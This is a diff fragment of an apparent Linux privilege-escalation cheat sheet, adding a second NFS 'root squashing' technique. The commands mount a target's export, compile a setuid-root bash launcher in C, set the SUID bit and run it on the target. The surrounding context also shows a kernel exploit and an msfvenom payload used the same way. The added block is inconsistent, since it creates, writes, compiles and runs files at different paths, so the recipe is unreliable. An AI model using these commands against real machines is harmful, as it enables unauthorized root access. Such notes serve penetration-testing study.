@@ -307,6 +307,7 @@ gcc /tmp/40838.c -pthread -o /tmp/exploit # target machine
 ./exploit # target machine
 ```
 ## NFS ✅
+### Root Squashing (1) ✡️
 ```bash
 cat /etc/exports # target machine
 mkdir /tmp/nfs # our kali
@@ -315,6 +316,17 @@ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # our
 chmod +xs /tmp/nfs/shell.elf # our kali
 /tmp/shell.elf # target machine
 ```
+### Root Squashing (2) ✡️
+```bash
+showmount -e 10.10.10.10 # our kali
+mkdir /tmp/1 # our kali
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs # our kali
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c # our kali
+gcc /tmp/1/shell.c -o /tmp/1/shell # our kali 
+chmod +s /tmp/1/shell # our kali OR target machine
+/tmp/shell # target machine
+```
+
 
 
 #### The following list shows the most commons file extensions for linux: ❗️☪️
